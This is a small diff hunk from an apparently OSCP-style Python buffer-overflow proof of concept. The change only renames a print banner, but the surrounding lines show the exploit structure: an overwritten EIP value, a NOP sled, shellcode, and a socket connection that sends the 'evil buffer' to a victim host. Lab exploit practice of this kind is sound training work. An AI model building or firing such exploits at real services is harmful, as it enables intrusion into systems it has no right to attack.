@@ -59,7 +59,7 @@ eip = "\xcf\x10\x80\x14"
 ## build the buffer string
 thebuff = bigbuff + eip + nopsled + shellcode
 
-print "[*] VulnApp1 Buffer Overflow POC OSCP.." 
+print "[*] Vuln1 Buffer Overflow PoC.." 
 s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
 s.connect((victim, port))
 print "[*] Sending evil buffer..."
